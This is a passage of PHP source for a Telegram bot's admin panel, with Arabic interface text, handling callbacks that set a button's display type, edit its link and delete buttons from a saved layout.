'chat_id' => $chat_id,
'text' => "• تم تحديث المحتوى بنجاح",
'parse_mode' => 'markdown',
'reply_markup' => json_encode(['inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "zh|$id"]]]])
]);
}
exit;
}
if (preg_match("#^showtype:(.+)$#", $data, $m)) {
$id = $m[1];
if (!isset($joo_azrar['joos'][$id])) exit;
$curr = $joo_azrar['joos'][$id]['Type'];
$options = [
['EditMessageText', 'تعديل الرسالة'],
['sendMessage', 'ارسال الرسالة'],
['sendMessageSilent', 'همسة']
];
$markup = [];
foreach ($options as [$code, $label]) {
$check = ($code == $curr) ? "✅ " : "";
$markup[] = [['text' => $check . $label, 'callback_data' => "settype:$code:$id"]];
}
$markup[] = [['text' => "رجوع", 'callback_data' => "zh|$id"]];
bot('editMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "• اختر طريقة عرض النص للزر:\n\n{$joo_azrar['joos'][$id]['name']}",
'parse_mode' => "markdown",
'reply_markup' => json_encode(['inline_keyboard' => $markup])
]);
exit;
}
if (preg_match("#^settype:(EditMessageText|sendMessage|sendMessageSilent):(.+)$#", $data, $m)) {
$new = $m[1];
$id = $m[2];
if (!isset($joo_azrar['joos'][$id])) exit;
$joo_azrar['joos'][$id]['Type'] = $new;
save($joo_azrar);
$show = [
"EditMessageText" => "تعديل الرسالة",
"sendMessage" => "ارسال الرسالة",
"sendMessageSilent" => "همسة"
][$new];
bot('answerCallbackQuery', [
'callback_query_id' => $update->callback_query->id,
'text' => "تم التغيير الى: $show",
'show_alert' => false
]);
bot('editMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "• تم تغيير طريقة عرض الزر:\n{$joo_azrar['joos'][$id]['name']}",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "zh|$id"]]]
])
]);
exit;
}
$edit = explode("|", $data);
if ($edit[0] == "editlink") {
$id = $edit[1];
if (isset($joo_azrar['links'][$id])) {
$joo_azrar['mode'] = "editlink";
$joo_azrar['edit_id'] = $id;
save($joo_azrar);
bot('editMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "• ارسل الرابط الجديد لهذا الزر",
'parse_mode' => 'markdown',
'reply_markup' => json_encode([
'inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "zrar"]]]
])
]);
exit;
}
}
if ($joo_azrar['mode'] == "editlink" && $text != null && $text != "/start") {
$id = $joo_azrar['edit_id'];
if (preg_match("#^https?://#", $text)) {
$joo_azrar['links'][$id]['url'] = $text;
$joo_azrar['mode'] = null;
unset($joo_azrar['edit_id']);
save($joo_azrar);
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "• تم تحديث الرابط بنجاح",
'parse_mode' => 'markdown',
'reply_markup' => json_encode([
'inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "zrar"]]]
])
]);
} else {
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "• الرابط غير صالح\nارسل رابط يبدأ بـ http او https",
'parse_mode' => 'markdown'
]);
}
exit;
}
$zdelete = explode("|", $data);
if ($zdelete[0] == "delete") {
$id = $zdelete[1];
$btn_name = "هذا الزر";
if (isset($joo_azrar['joos'][$id])) {
$btn_name = $joo_azrar['joos'][$id]['name'];
unset($joo_azrar['joos'][$id]);
} elseif (isset($joo_azrar['links'][$id])) {
$btn_name = $joo_azrar['links'][$id]['name'];
unset($joo_azrar['links'][$id]);
}
foreach($joo_azrar['rows'] as $ri => $row){
foreach($row as $bi => $bid){
if($bid == $id){
unset($joo_azrar['rows'][$ri][$bi]);
$joo_azrar['rows'][$ri] = array_values($joo_azrar['rows'][$ri]);
}
}
}
save($joo_azrar);
bot('editMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "• اسم الزر: $btn_name\n\n- تم مسح الزر بنجاح",
'parse_mode' => "markdown",
'disable_web_page_preview' => true,
'reply_markup' => json_encode([
'inline_keyboard' => [[['text' => "رجوع", 'callback_data' => "zrar"]]]
])
]);
exit;
}

